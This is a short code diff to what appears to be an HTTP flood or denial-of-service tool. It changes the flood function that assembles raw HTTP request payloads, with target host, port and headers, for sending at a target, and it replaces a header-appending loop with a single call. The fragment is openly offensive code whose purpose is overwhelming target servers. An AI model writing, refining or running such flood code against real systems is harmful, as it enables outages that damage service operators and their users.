@@ -23,6 +23,7 @@ SOFTWARE.
 '''
 
 import time, socket, ssl
+
 from urllib.parse import urlparse
 from src.core import Core
 from src.utils import *
@@ -54,9 +55,7 @@ def flood(attack_id, url, stoptime) -> None:
             payload+= f' {Core.target_host}:{str(Core.target_port)}' # target host + port
             payload+= f' HTTP/{Core.http_proto_ver}\r\n' # http protocol version
             payload+= f'Host: {Core.target_host}:{str(Core.target_port)}\r\n' # Host
-
-            for key, value in utils().buildheaders(url, True).items(): # append all headers
-                payload += f'{key}: {value}\r\n'
+            payload+= utils().buildheaders(url, True) # append all headers
             
             payload+= 'Content-Length: {len}\r\n'
             payload = payload.format(len=len(payload))
